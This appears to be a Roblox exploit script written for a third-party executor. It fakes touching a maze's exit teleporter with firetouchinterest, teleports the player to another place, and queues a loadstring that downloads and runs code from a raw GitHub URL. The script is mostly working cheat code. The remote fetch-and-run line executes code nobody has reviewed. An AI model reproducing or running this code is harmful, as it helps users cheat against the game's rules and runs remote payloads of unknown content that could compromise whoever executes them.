repeat task.wait() until game:IsLoaded()

local Players = game:GetService("Players")

while Players.LocalPlayer == nil do
    task.wait()
end

local player = Players.LocalPlayer

if not player.Character then
    player.CharacterAdded:Wait()
end

local char = player.Character

local root
while true do
    root = char:FindFirstChild("HumanoidRootPart")
    if root then break end
    task.wait()
end

local teleporter
while true do
    teleporter = workspace:FindFirstChild("Map", true)
        and workspace.Map.Walls.SpinningMaze.WebhookExit:FindFirstChild("Teleporter")
    if teleporter then break end
    task.wait()
end

firetouchinterest(root, teleporter, 0)
task.wait(0.1)
firetouchinterest(root, teleporter, 1)

queue_on_teleport([[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/someoneVIOLET/modeplace-webhook1/refs/heads/main/something"))()
]])

game:GetService("TeleportService"):Teleport(138009838341810, player)